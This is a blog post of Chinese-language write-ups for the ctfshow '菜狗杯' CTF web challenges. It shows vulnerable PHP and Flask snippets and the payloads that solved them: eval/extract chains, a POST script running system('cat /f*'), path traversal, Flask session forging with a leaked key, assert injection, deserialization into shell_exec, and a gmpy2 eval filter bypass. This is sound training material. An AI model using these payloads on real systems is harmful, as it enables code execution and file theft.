<!DOCTYPE html>


<html lang="zh-CN">
  

    <head>
      <meta charset="utf-8" />
        
      <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1"
      />
      <title>ctfshow菜狗杯 |  b1xcy&#39;s blog</title>
  <meta name="generator" content="hexo-theme-ayer">
      
      <link rel="shortcut icon" href="/favicon.ico" />
       
<link rel="stylesheet" href="/dist/main.css">

      
<link rel="stylesheet" href="/css/fonts/remixicon.css">

      
<link rel="stylesheet" href="/css/custom.css">
 
      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
       
 

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
      />
      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>

      <!-- mermaid -->
      
      <style>
        .swal2-styled.swal2-confirm {
          font-size: 1.6rem;
        }
      </style>
    </head>
  </html>
</html>


<body>
  <div id="app">
    
      
    <main class="content on">
      <section class="outer">
  <article
  id="post-菜狗杯"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
  ctfshow菜狗杯
</h1>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/09/09/%E8%8F%9C%E7%8B%97%E6%9D%AF/" class="article-date">
  <time datetime="2023-09-09T08:30:45.310Z" itemprop="datePublished">2023-09-09</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/ctf/">ctf</a>
  </div>
  
<div class="word_count">
    <span class="post-time">
        <span class="post-meta-item-icon">
            <i class="ri-quill-pen-line"></i>
            <span class="post-meta-item-text"> 字数统计:</span>
            <span class="post-count">3.3k</span>
        </span>
    </span>

    <span class="post-time">
        &nbsp; | &nbsp;
        <span class="post-meta-item-icon">
            <i class="ri-book-open-line"></i>
            <span class="post-meta-item-text"> 阅读时长≈</span>
            <span class="post-count">17 分钟</span>
        </span>
    </span>
</div>
 
    </div>
      
    <div class="tocbot"></div>




  
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval($_REQUEST[$_GET[$_POST[$_COOKIE[&#x27;CTFshow-QQ群:&#x27;]]]][6][0][7][5][8][0][9][4][4]);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309091656155.png" alt="image-20230909165613083"></p>
<h2 id="web2-c0me-t0-s1gn"><a href="#web2-c0me-t0-s1gn" class="headerlink" title="web2 c0me_t0_s1gn"></a>web2 c0me_t0_s1gn</h2><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309091708112.png" alt="image-20230909170813094"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309091708492.png" alt="image-20230909170819468"></p>
<h2 id="我的眼里只有"><a href="#我的眼里只有" class="headerlink" title="我的眼里只有$"></a>我的眼里只有$</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_</span>);</span><br></pre></td></tr></table></figure>

<p>extract():将数组中变量导入到符号表，extract(array(“a” &#x3D;&gt; “Cat”))等价于$a&#x3D;”Cat”</p>
<p>传入POST的时候本来就会将POST内容作为数组传入，本质其实就是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$arr</span> = [<span class="string">&quot;_&quot;</span>=&gt;<span class="string">&quot;a&quot;</span>,<span class="string">&quot;a&quot;</span>=&gt;<span class="string">&quot;b&quot;</span>,<span class="string">&quot;b&quot;</span>=&gt;<span class="string">&quot;c&quot;</span>,<span class="string">&quot;c&quot;</span>=&gt;<span class="string">&quot;d&quot;</span>,<span class="string">&quot;d&quot;</span>=&gt;<span class="string">&quot;e&quot;</span>,<span class="string">&quot;e&quot;</span>=&gt;<span class="string">&quot;f&quot;</span>,<span class="string">&quot;f&quot;</span>=&gt;<span class="string">&quot;g&quot;</span>,<span class="string">&quot;g&quot;</span>=&gt;<span class="string">&quot;h&quot;</span>,<span class="string">&quot;h&quot;</span>=&gt;<span class="string">&quot;i&quot;</span>,<span class="string">&quot;i&quot;</span>=&gt;<span class="string">&quot;j&quot;</span>,<span class="string">&quot;j&quot;</span>=&gt;<span class="string">&quot;k&quot;</span>,<span class="string">&quot;k&quot;</span>=&gt;<span class="string">&quot;l&quot;</span>,<span class="string">&quot;l&quot;</span>=&gt;<span class="string">&quot;m&quot;</span>,<span class="string">&quot;m&quot;</span>=&gt;<span class="string">&quot;n&quot;</span>,<span class="string">&quot;n&quot;</span>=&gt;<span class="string">&quot;o&quot;</span>,<span class="string">&quot;o&quot;</span>=&gt;<span class="string">&quot;p&quot;</span>,<span class="string">&quot;p&quot;</span>=&gt;<span class="string">&quot;q&quot;</span>,<span class="string">&quot;q&quot;</span>=&gt;<span class="string">&quot;r&quot;</span>,<span class="string">&quot;r&quot;</span>=&gt;<span class="string">&quot;s&quot;</span>,<span class="string">&quot;s&quot;</span>=&gt;<span class="string">&quot;t&quot;</span>,<span class="string">&quot;t&quot;</span>=&gt;<span class="string">&quot;u&quot;</span>,<span class="string">&quot;u&quot;</span>=&gt;<span class="string">&quot;v&quot;</span>,<span class="string">&quot;v&quot;</span>=&gt;<span class="string">&quot;w&quot;</span>,<span class="string">&quot;w&quot;</span>=&gt;<span class="string">&quot;x&quot;</span>,<span class="string">&quot;x&quot;</span>=&gt;<span class="string">&quot;y&quot;</span>,<span class="string">&quot;y&quot;</span>=&gt;<span class="string">&quot;z&quot;</span>,<span class="string">&quot;z&quot;</span>=&gt;<span class="string">&quot;aa&quot;</span>,<span class="string">&quot;aa&quot;</span>=&gt;<span class="string">&quot;bb&quot;</span>,<span class="string">&quot;bb&quot;</span>=&gt;<span class="string">&quot;cc&quot;</span>,<span class="string">&quot;cc&quot;</span>=&gt;<span class="string">&quot;dd&quot;</span>,<span class="string">&quot;dd&quot;</span>=&gt;<span class="string">&quot;xx&quot;</span>,<span class="string">&quot;xx&quot;</span>=&gt;<span class="string">&quot;yy&quot;</span>,<span class="string">&quot;yy&quot;</span>=&gt;<span class="string">&quot;ta&quot;</span>,<span class="string">&quot;ta&quot;</span>=&gt;<span class="string">&quot;ad&quot;</span>,<span class="string">&quot;ad&quot;</span>=&gt;<span class="string">&quot;bba&quot;</span>,<span class="string">&quot;bba&quot;</span>=&gt;<span class="string">&quot;sh&quot;</span>,<span class="string">&quot;sh&quot;</span>=&gt;<span class="string">&quot;ls&quot;</span>]</span><br></pre></td></tr></table></figure>

<p>太麻烦了，写个爆破脚本，由于php中变量名开头必须是字母或者_，就手动加一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> request</span><br><span class="line">url = <span class="string">&quot;http://localhost:9090/&quot;</span></span><br><span class="line">data = <span class="string">&quot;_=_0&amp;&quot;</span></span><br><span class="line">code = <span class="string">&quot;_34=system(&#x27;cat /f*&#x27;)&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">34</span>):</span><br><span class="line">    data = data + <span class="string">&quot;_&quot;</span> +<span class="built_in">str</span>(i) + <span class="string">&quot;=&quot;</span> + <span class="string">&quot;_&quot;</span> + <span class="built_in">str</span>(i+<span class="number">1</span>) + <span class="string">&quot;&amp;&quot;</span></span><br><span class="line">data = data + code</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">r = requests.post(url=url,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p>结果就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_=_0&amp;_0=_1&amp;_1=_2&amp;_2=_3&amp;_3=_4&amp;_4=_5&amp;_5=_6&amp;_6=_7&amp;_7=_8&amp;_8=_9&amp;_9=_10&amp;_10=_11&amp;_11=_12&amp;_12=_13&amp;_13=_14&amp;_14=_15&amp;_15=_16&amp;_16=_17&amp;_17=_18&amp;_18=_19&amp;_19=_20&amp;_20=_21&amp;_21=_22&amp;_22=_23&amp;_23=_24&amp;_24=_25&amp;_25=_26&amp;_26=_27&amp;_27=_28&amp;_28=_29&amp;_29=_30&amp;_30=_31&amp;_31=_32&amp;_32=_33&amp;_33=_34&amp;_34=system(&quot;cat /f*&quot;);</span><br></pre></td></tr></table></figure>

<h2 id="抽老婆"><a href="#抽老婆" class="headerlink" title="抽老婆"></a>抽老婆</h2><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309091810331.png" alt="image-20230909181013311"></p>
<p>一眼路径，随便试一下有报错app.py</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309091810892.png" alt="image-20230909181033871"></p>
<p>&#x2F;download?file&#x3D;..&#x2F;..&#x2F;app.py拿到源代码+sk，直接session伪造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s &#x27;tanji_is_A_boy_Yooooooooooooooooooooo!&#x27; -t &#x27;&#123;&quot;isadmin&quot;:&quot;True&quot;&#125;&#x27; </span><br></pre></td></tr></table></figure>

<h2 id="一言既出"><a href="#一言既出" class="headerlink" title="一言既出"></a>一言既出</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>] == <span class="number">114514</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">assert</span>(<span class="string">&quot;intval(<span class="subst">$_GET</span>[num])==1919810&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;一言既出，驷马难追!&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>学到了，弱比较比较数字，只会比对单数字的部分，assert里可以直接视作php语句，所以可以用);&#x2F;&#x2F;闭合然后把后面的die注释掉</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=114514);//</span><br></pre></td></tr></table></figure>

<h2 id="驷马难追"><a href="#驷马难追" class="headerlink" title="驷马难追"></a>驷马难追</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">     if ($_GET[&#x27;num&#x27;] == 114514 &amp;&amp; check($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">              assert(&quot;intval($_GET[num])==1919810&quot;) or die(&quot;一言既出，驷马难追!&quot;);</span><br><span class="line">              echo $flag;</span><br><span class="line">     &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">function check($str)&#123;</span><br><span class="line">  return !preg_match(&quot;/[a-z]|\;|\(|\)/&quot;,$str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>本地php版本应该有问题，assert不管怎么样都是true</p>
<p>但是这个intval是可以用+-*&#x2F;的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=114514%2b1805296(+编码为%2b)</span><br></pre></td></tr></table></figure>

<h2 id="TapTapTap"><a href="#TapTapTap" class="headerlink" title="TapTapTap"></a>TapTapTap</h2><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309092235912.png" alt="image-20230909223548862"></p>
<h2 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class Webshell &#123;</span><br><span class="line">    public $cmd = &#x27;echo &quot;Hello World!&quot;&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        $this-&gt;init();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function init() &#123;</span><br><span class="line">        if (!preg_match(&#x27;/flag/i&#x27;, $this-&gt;cmd)) &#123;</span><br><span class="line">            $this-&gt;exec($this-&gt;cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function exec($cmd) &#123;</span><br><span class="line">        $result = shell_exec($cmd);</span><br><span class="line">        echo $result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ez反序列化</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=O:8:&quot;Webshell&quot;:1:&#123;s:3:&quot;cmd&quot;;s:15:&quot;cat f* | base64&quot;;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="化零为整"><a href="#化零为整" class="headerlink" title="化零为整"></a>化零为整</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$result=&#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">for ($i=1;$i&lt;=count($_GET);$i++)&#123;</span><br><span class="line">    if (strlen($_GET[$i])&gt;1)&#123;</span><br><span class="line">        die(&quot;你太长了！！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">    $result=$result.$_GET[$i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($result ===&quot;大牛&quot;)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>挺有意思的，在php中，一个中文字的len是3，所以要把一个中文拆成三分然后通过 <strong>.</strong> 拼接起来。但是一直不知道要怎么拆分，看了wp才知道是用url编码，所以就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?1=%E5&amp;2=%A4&amp;3=%A7&amp;4=%E7&amp;5=%89&amp;6=%9B</span><br></pre></td></tr></table></figure>

<h2 id="无一幸免"><a href="#无一幸免" class="headerlink" title="无一幸免"></a>无一幸免</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_GET[&#x27;0&#x27;]))&#123;</span><br><span class="line">    $arr[$_GET[&#x27;0&#x27;]]=1;</span><br><span class="line">    if ($arr[]=1)&#123;</span><br><span class="line">        die($flag);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;nonono!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>啊？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?0</span><br></pre></td></tr></table></figure>

<p>其实是题目有问题，本来应该是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if ($arr[]=1)&#123;</span><br><span class="line">        die($flag);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;nonono!&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这样对$arr[]进行一个赋值，如果不进行特殊操作是恒为真的，所以要让这个赋值操作中断</p>
<p>中断原理就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">索引数组最大下标等于最大int数，对其追加会导致整型数溢出，进而引起追加失败</span><br><span class="line">int范围查阅Manual可知：32位最大是231-1，64位是263-1</span><br><span class="line">也就是2147483647与9223372036854775807</span><br><span class="line">https://blog.csdn.net/Xxy605/article/details/120049069</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?0=9223372036854775807</span><br></pre></td></tr></table></figure>



<h2 id="传说之下（雾）"><a href="#传说之下（雾）" class="headerlink" title="传说之下（雾）"></a>传说之下（雾）</h2><p>学到了，本地修改game.js文件，赢一次+2078分，吃一个就能拿flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309100011119.png" alt="image-20230910001159084"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309100012462.png" alt="image-20230910001215439"></p>
<h2 id="算力超群"><a href="#算力超群" class="headerlink" title="算力超群"></a>算力超群</h2><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309100033711.png" alt="image-20230910003303691"></p>
<p>随便算个数，进去把5改成7*7有正确回显49，那就是ssti</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?number1=&amp;operator=&amp;number2=__import__(&quot;os&quot;).popen(&quot;cat /f*&quot;).read()</span><br></pre></td></tr></table></figure>

<h2 id="算力升级"><a href="#算力升级" class="headerlink" title="算力升级"></a>算力升级</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/tiesuanzi&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tiesuanzi</span>():</span><br><span class="line">    code=request.form.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> pattern.findall(code):<span class="comment">#从code里把单词拿出来</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;\d+$&#x27;</span>,item):<span class="comment">#如果不是数字</span></span><br><span class="line">            <span class="keyword">if</span> item <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">dir</span>(gmpy2):<span class="comment">#逐个和gmpy2库里的函数名比较</span></span><br><span class="line">               <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;result&quot;</span>:<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">f&quot;你想干什么？<span class="subst">&#123;item&#125;</span>不是有效的函数&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result=<span class="built_in">eval</span>(code)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;result&quot;</span>:<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">f&quot;计算成功，答案是<span class="subst">&#123;result&#125;</span>&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;result&quot;</span>:<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">f&quot;没有执行成功，请检查你的输入。&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>

<p>限制是实用的关键字只能是gmpy2中的函数名</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(gmpy2)</span><br><span class="line">[<span class="string">&#x27;Default&#x27;</span>, <span class="string">&#x27;DivisionByZeroError&#x27;</span>, <span class="string">&#x27;HAVE_THREADS&#x27;</span>, <span class="string">&#x27;InexactResultError&#x27;</span>, <span class="string">&#x27;InvalidOperationError&#x27;</span>, <span class="string">&#x27;OverflowResultError&#x27;</span>, <span class="string">&#x27;RangeError&#x27;</span>, <span class="string">&#x27;RoundAwayZero&#x27;</span>, <span class="string">&#x27;RoundDown&#x27;</span>, <span class="string">&#x27;RoundToNearest&#x27;</span>, <span class="string">&#x27;RoundToZero&#x27;</span>, <span class="string">&#x27;RoundUp&#x27;</span>, <span class="string">&#x27;UnderflowResultError&#x27;</span>, <span class="string">&#x27;_C_API&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__cached__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__file__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__path__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;_mpmath_create&#x27;</span>, <span class="string">&#x27;_mpmath_normalize&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;add&#x27;</span>, <span class="string">&#x27;agm&#x27;</span>, <span class="string">&#x27;ai&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;bincoef&#x27;</span>, ……]</span><br></pre></td></tr></table></figure>

<p>可见，有一个<code>__builtins__</code>可以使用，而从<code>gmpy2.__builtins__</code>里有eval函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;gmpy2.__builtins__[&#x27;erf&#x27;[0]+&#x27;div&#x27;[2]+&#x27;ai&#x27;[0]+&#x27;lcm&#x27;[0]](&quot;</span></span><br><span class="line"><span class="comment">##&#x27;erf&#x27;[0]+&#x27;div&#x27;[2]+&#x27;ai&#x27;[0]+&#x27;lcm&#x27;[0]==eval</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">&quot;/&#x27;(). &quot;</span>:</span><br><span class="line">                temp_index=<span class="number">0</span></span><br><span class="line">                temp_string=<span class="string">&#x27;x&#x27;</span>*<span class="number">20</span></span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">dir</span>(gmpy2):</span><br><span class="line">                        <span class="keyword">if</span> j.find(i)&gt;=<span class="number">0</span>:</span><br><span class="line">                                <span class="keyword">if</span> <span class="built_in">len</span>(j)&lt;<span class="built_in">len</span>(temp_string):</span><br><span class="line">                                        temp_string=j</span><br><span class="line">                                        temp_index=j.find(i)</span><br><span class="line">                payload+=<span class="string">f&#x27;\&#x27;<span class="subst">&#123;temp_string&#125;</span>\&#x27;[<span class="subst">&#123;temp_index&#125;</span>]+&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                payload+=<span class="string">f&#x27;\&quot;<span class="subst">&#123;i&#125;</span>\&quot;+&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=payload[:-<span class="number">1</span>]+<span class="string">&#x27;)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gmpy2.__builtins__[&#x27;erf&#x27;[0]+&#x27;div&#x27;[2]+&#x27;ai&#x27;[0]+&#x27;lcm&#x27;[0]](&#x27;c_div&#x27;[1]+&#x27;c_div&#x27;[1]+&#x27;ai&#x27;[1]+&#x27;agm&#x27;[2]+&#x27;cmp&#x27;[2]+&#x27;cos&#x27;[1]+&#x27;erf&#x27;[1]+&#x27;cot&#x27;[2]+&#x27;c_div&#x27;[1]+&#x27;c_div&#x27;[1]+&quot;(&quot;+&quot;&#x27;&quot;+&#x27;cos&#x27;[1]+&#x27;cos&#x27;[2]+&quot;&#x27;&quot;+&quot;)&quot;+&quot;.&quot;+&#x27;cmp&#x27;[2]+&#x27;cos&#x27;[1]+&#x27;cmp&#x27;[2]+&#x27;erf&#x27;[0]+&#x27;jn&#x27;[1]+&quot;(&quot;+&quot;&#x27;&quot;+&#x27;cmp&#x27;[0]+&#x27;ai&#x27;[0]+&#x27;cot&#x27;[2]+&quot; &quot;+&quot;/&quot;+&#x27;erf&#x27;[2]+&#x27;lcm&#x27;[0]+&#x27;ai&#x27;[0]+&#x27;agm&#x27;[1]+&quot;&#x27;&quot;+&quot;)&quot;+&quot;.&quot;+&#x27;erf&#x27;[1]+&#x27;erf&#x27;[0]+&#x27;ai&#x27;[0]+&#x27;add&#x27;[1]+&quot;(&quot;+&quot;)&quot;)</span><br></pre></td></tr></table></figure>

<h2 id="easyPytHon-P"><a href="#easyPytHon-P" class="headerlink" title="easyPytHon_P"></a>easyPytHon_P</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from flask import request</span><br><span class="line">cmd: str = request.form.get(&#x27;cmd&#x27;)</span><br><span class="line">param: str = request.form.get(&#x27;param&#x27;)</span><br><span class="line"># ------------------------------------- Don&#x27;t modify ↑ them ↑! But you can write your code ↓</span><br><span class="line">import subprocess, os</span><br><span class="line">if cmd is not None and param is not None:</span><br><span class="line">    try:</span><br><span class="line">        tVar = subprocess.run([cmd[:3], param, __file__], cwd=os.getcwd(), timeout=5)</span><br><span class="line">        print(&#x27;Done!&#x27;)</span><br><span class="line">    except subprocess.TimeoutExpired:</span><br><span class="line">        print(&#x27;Timeout!&#x27;)</span><br><span class="line">    except:</span><br><span class="line">        print(&#x27;Error!&#x27;)</span><br><span class="line">else:</span><br><span class="line">    print(&#x27;No Flag!&#x27;)</span><br></pre></td></tr></table></figure>

<p>传入cmd和param，cmd值截取前三个，__file__表示的是当前py文件的绝对路径</p>
<p>subprocess.run([“ls”,”&#x2F;“,”&#x2F;etc”])会同时列出&#x2F;和&#x2F;etc的文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309101522095.png" alt="image-20230910152237015"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=cat&amp;param=/app/flag.txt</span><br></pre></td></tr></table></figure>

